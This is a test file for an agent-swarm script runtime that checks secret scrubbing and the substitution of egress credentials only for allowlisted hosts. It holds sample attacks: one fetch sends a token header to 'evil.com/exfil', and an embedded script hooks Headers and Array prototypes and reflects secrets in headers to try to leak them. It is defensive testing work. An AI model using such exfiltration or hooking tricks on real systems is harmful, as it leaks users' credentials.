import { afterEach, beforeEach, describe, expect, test } from "bun:test";
import {
  buildEgressSecrets,
  patchFetchWithEgressSubstitution,
} from "../scripts-runtime/egress-secrets";
import { QuickJSScriptExecutor } from "../scripts-runtime/executors/quickjs";
import { runScript } from "../scripts-runtime/loader";
import { refreshSecretScrubberCache } from "../utils/secret-scrubber";
import { SKIP_SANDBOX_SPAWN_TESTS } from "./sandbox-spawn-test-helpers";

const savedEnv = { ...process.env };
// Every test in the "runtime secret egress" block below calls runScript(),
// which shells out via Bun.spawn. The egress-substitution block below it is
// pure JS (mocked fetch) and stays on plain `test`.
const spawnTest = test.skipIf(SKIP_SANDBOX_SPAWN_TESTS);

beforeEach(() => {
  process.env.AGENT_SWARM_API_KEY = "example-runtime-egress-secret-1234567890";
  refreshSecretScrubberCache();
});

afterEach(() => {
  for (const key of Object.keys(process.env)) {
    if (!(key in savedEnv)) delete process.env[key];
  }
  for (const [key, value] of Object.entries(savedEnv)) {
    if (value === undefined) delete process.env[key];
    else process.env[key] = value;
  }
  refreshSecretScrubberCache();
});

describe("runtime secret egress", () => {
  spawnTest("scrubObject catches unwrapped returned config secrets", async () => {
    const output = await runScript({
      agentId: "agent-1",
      resources: { memoryMb: 2048 },
      source:
        "export default async (_args, ctx) => ({ leaked: ctx.stdlib.Redacted.value(ctx.swarm.config.apiKey) });",
    });

    expect(output.result).toEqual({ leaked: "[REDACTED:AGENT_SWARM_API_KEY]" });
  });

  spawnTest("wrapped config values stringify to redacted in the result file", async () => {
    const output = await runScript({
      agentId: "agent-1",
      resources: { memoryMb: 2048 },
      source: "export default async (_args, ctx) => ({ wrapped: ctx.swarm.config.apiKey });",
    });

    expect(output.result).toEqual({ wrapped: "<redacted>" });
  });

  spawnTest("drops unresolved placeholder headers when no credentials resolve", async () => {
    delete process.env.GITHUB_TOKEN;
    let observedAuthorization: string | null = null;
    const server = Bun.serve({
      port: 0,
      fetch(req) {
        observedAuthorization = req.headers.get("authorization");
        return new Response("ok");
      },
    });

    try {
      const output = await runScript({
        agentId: "agent-1",
        resources: { memoryMb: 2048 },
        source: `
          export default async () => {
            const response = await fetch("http://127.0.0.1:${server.port}", {
              headers: { Authorization: "Bearer [REDACTED:MISSING_VENDOR_KEY]" },
            });
            return response.text();
          };
        `,
      });

      expect(output.error).toBeUndefined();
      expect(output.result).toBe("ok");
      expect(observedAuthorization).toBeNull();
    } finally {
      server.stop(true);
    }
  });

  spawnTest(
    "confines broker secrets from If-Match header reflection, prototype hooks, and ctx.swarm.config.get across Native and QuickJS executors",
    async () => {
      const prevAllowLoopback = process.env.AGENT_SWARM_ALLOW_LOOPBACK_EGRESS;
      process.env.AGENT_SWARM_ALLOW_LOOPBACK_EGRESS = "true";

      const observedRequests: Array<{
        authorization: string | null;
        ifMatch: string | null;
        xCustom: string | null;
      }> = [];

      const server = Bun.serve({
        hostname: "127.0.0.1",
        port: 0,
        fetch(req) {
          observedRequests.push({
            authorization: req.headers.get("authorization"),
            ifMatch: req.headers.get("if-match"),
            xCustom: req.headers.get("x-custom"),
          });
          return Response.json({
            echoIfMatch: req.headers.get("if-match"),
            echoCustom: req.headers.get("x-custom"),
          });
        },
      });

      const realBrokerSecret = "broker-confined-real-secret-xyz987";
      const realFsSecret = "agent-fs-confined-real-secret-abc123";
      const egressSecrets = [
        {
          configKey: "connection.local.secret",
          placeholder: "[REDACTED:connection.local.secret]",
          allowedHosts: ["127.0.0.1"],
          headerTemplate: "Authorization: Bearer [REDACTED:connection.local.secret]",
          scope: "global" as const,
          scopeId: null,
          active: true,
          authKind: "config" as const,
          value: realBrokerSecret,
        },
      ];

      const scriptSource = `
      export default async (_args, ctx) => {
        const hooked = [];
        const origSet = Headers.prototype.set;
        const origJoin = Array.prototype.join;
        Headers.prototype.set = function (k, v) {
          hooked.push(String(v));
          return origSet.call(this, k, v);
        };
        Array.prototype.join = function (sep) {
          const out = origJoin.call(this, sep);
          hooked.push(String(out));
          return out;
        };
        const res = await fetch("http://127.0.0.1:${server.port}/test", {
          headers: {
            Authorization: "Bearer [REDACTED:connection.local.secret]",
            "If-Match": "[REDACTED:connection.local.secret]",
            "X-Custom": "[REDACTED:connection.local.secret]",
          },
        });
        const body = await res.json();
        return {
          body,
          connSecretFromConfig: ctx.swarm.config.get("connection.local.secret") ?? null,
          fsSecretFromConfig: ctx.swarm.config.get("AGENT_FS_API_KEY") ?? null,
          normalFromConfig: ctx.stdlib.Redacted.value(ctx.swarm.config.get("NORMAL_PUBLIC_KEY")) ?? null,
          hookedJoined: hooked.join("|"),
        };
      };
    `;

      try {
        const nativeOutput = await runScript({
          agentId: "agent-1",
          resources: { memoryMb: 2048 },
          egressSecrets,
          userConfig: {
            NORMAL_PUBLIC_KEY: { value: "public-ok", isSecret: false },
          },
          source: scriptSource,
        });

        expect(nativeOutput.error).toBeUndefined();
        expect(nativeOutput.result).toEqual({
          body: { echoIfMatch: null, echoCustom: null },
          connSecretFromConfig: null,
          fsSecretFromConfig: null,
          normalFromConfig: "public-ok",
          hookedJoined: expect.any(String),
        });
        expect(JSON.stringify(nativeOutput.result)).not.toContain(realBrokerSecret);
        expect(JSON.stringify(nativeOutput.result)).not.toContain(realFsSecret);

        const quickjs = new QuickJSScriptExecutor();
        const quickjsOutput = await runScript({
          executor: quickjs,
          agentId: "agent-1",
          resources: { memoryMb: 2048 },
          egressSecrets,
          userConfig: {
            NORMAL_PUBLIC_KEY: { value: "public-ok", isSecret: false },
          },
          source: scriptSource,
        });

        expect(quickjsOutput.error).toBeUndefined();
        expect(quickjsOutput.result).toEqual({
          body: { echoIfMatch: null, echoCustom: null },
          connSecretFromConfig: null,
          fsSecretFromConfig: null,
          normalFromConfig: "public-ok",
          hookedJoined: expect.any(String),
        });
        expect(JSON.stringify(quickjsOutput.result)).not.toContain(realBrokerSecret);
        expect(JSON.stringify(quickjsOutput.result)).not.toContain(realFsSecret);

        expect(observedRequests).toEqual([
          {
            authorization: `Bearer ${realBrokerSecret}`,
            ifMatch: null,
            xCustom: null,
          },
          {
            authorization: `Bearer ${realBrokerSecret}`,
            ifMatch: null,
            xCustom: null,
          },
        ]);
      } finally {
        server.stop(true);
        if (prevAllowLoopback === undefined) {
          delete process.env.AGENT_SWARM_ALLOW_LOOPBACK_EGRESS;
        } else {
          process.env.AGENT_SWARM_ALLOW_LOOPBACK_EGRESS = prevAllowLoopback;
        }
      }
    },
  );
});

describe("egress-substitution", () => {
  describe("buildEgressSecrets", () => {
    test("includes GITHUB_TOKEN when set in env", async () => {
      process.env.GITHUB_TOKEN = "ghp_test1234567890abcdef";
      const secrets = await buildEgressSecrets();
      expect(secrets).toEqual([
        {
          configKey: "GITHUB_TOKEN",
          placeholder: "[REDACTED:GITHUB_TOKEN]",
          allowedHosts: ["api.github.com"],
          headerTemplate: "Authorization: Bearer [REDACTED:GITHUB_TOKEN]",
          scope: "global",
          scopeId: null,
          active: true,
          authKind: "config",
          value: "ghp_test1234567890abcdef",
        },
      ]);
    });

    test("returns empty array when GITHUB_TOKEN not set", async () => {
      delete process.env.GITHUB_TOKEN;
      const secrets = await buildEgressSecrets();
      expect(secrets).toEqual([]);
    });
  });

  describe("patchFetchWithEgressSubstitution", () => {
    let originalFetch: typeof globalThis.fetch;

    beforeEach(() => {
      originalFetch = globalThis.fetch;
    });

    afterEach(() => {
      globalThis.fetch = originalFetch;
    });

    test("substitutes placeholder in Authorization header for allowlisted host", async () => {
      let capturedHeaders: Headers | undefined;
      globalThis.fetch = async (_input: any, init?: any) => {
        capturedHeaders = new Headers(init?.headers);
        return new Response(JSON.stringify({ ok: true }), { status: 200 });
      };

      patchFetchWithEgressSubstitution([
        {
          placeholder: "[REDACTED:GITHUB_TOKEN]",
          allowedHosts: ["api.github.com"],
          headerTemplate: "Authorization: Bearer [REDACTED:GITHUB_TOKEN]",
          scope: "global",
          scopeId: null,
          active: true,
          value: "ghp_real_secret_value_123",
        },
      ]);

      await globalThis.fetch("https://api.github.com/repos/test/test", {
        headers: { Authorization: "Bearer [REDACTED:GITHUB_TOKEN]" },
      });

      expect(capturedHeaders?.get("authorization")).toBe("Bearer ghp_real_secret_value_123");
    });

    test("drops the placeholder header for a non-allowlisted host", async () => {
      let capturedHeaders: Headers | undefined;
      globalThis.fetch = async (_input: any, init?: any) => {
        capturedHeaders = new Headers(init?.headers);
        return new Response(JSON.stringify({ ok: true }), { status: 200 });
      };

      patchFetchWithEgressSubstitution([
        {
          placeholder: "[REDACTED:GITHUB_TOKEN]",
          allowedHosts: ["api.github.com"],
          headerTemplate: "Authorization: Bearer [REDACTED:GITHUB_TOKEN]",
          scope: "global",
          scopeId: null,
          active: true,
          value: "ghp_real_secret_value_123",
        },
      ]);

      await globalThis.fetch("https://evil.com/exfil", {
        headers: { Authorization: "Bearer [REDACTED:GITHUB_TOKEN]" },
      });

      // The placeholder header is DROPPED for non-allowlisted hosts: the
      // literal marker is useless to the destination and must never egress.
      expect(capturedHeaders?.get("authorization")).toBeNull();
    });

    test("passes through requests with no redacted placeholders", async () => {
      let callCount = 0;
      globalThis.fetch = async (_input: any, _init?: any) => {
        callCount++;
        return new Response("ok", { status: 200 });
      };

      patchFetchWithEgressSubstitution([
        {
          placeholder: "[REDACTED:GITHUB_TOKEN]",
          allowedHosts: ["api.github.com"],
          headerTemplate: "Authorization: Bearer [REDACTED:GITHUB_TOKEN]",
          scope: "global",
          scopeId: null,
          active: true,
          value: "ghp_real_secret_value_123",
        },
      ]);

      await globalThis.fetch("https://api.github.com/repos/test/test", {
        headers: { Accept: "application/json" },
      });

      expect(callCount).toBe(1);
    });

    test("does not substitute in request body", async () => {
      let capturedBody: string | undefined;
      globalThis.fetch = async (_input: any, init?: any) => {
        capturedBody = init?.body;
        return new Response("ok", { status: 200 });
      };

      patchFetchWithEgressSubstitution([
        {
          placeholder: "[REDACTED:GITHUB_TOKEN]",
          allowedHosts: ["api.github.com"],
          headerTemplate: "Authorization: Bearer [REDACTED:GITHUB_TOKEN]",
          scope: "global",
          scopeId: null,
          active: true,
          value: "ghp_real_secret_value_123",
        },
      ]);

      await globalThis.fetch("https://api.github.com/gists", {
        method: "POST",
        headers: { Authorization: "Bearer [REDACTED:GITHUB_TOKEN]" },
        body: JSON.stringify({ content: "[REDACTED:GITHUB_TOKEN]" }),
      });

      expect(capturedBody).toContain("[REDACTED:GITHUB_TOKEN]");
      expect(capturedBody).not.toContain("ghp_real_secret_value_123");
    });
  });
});
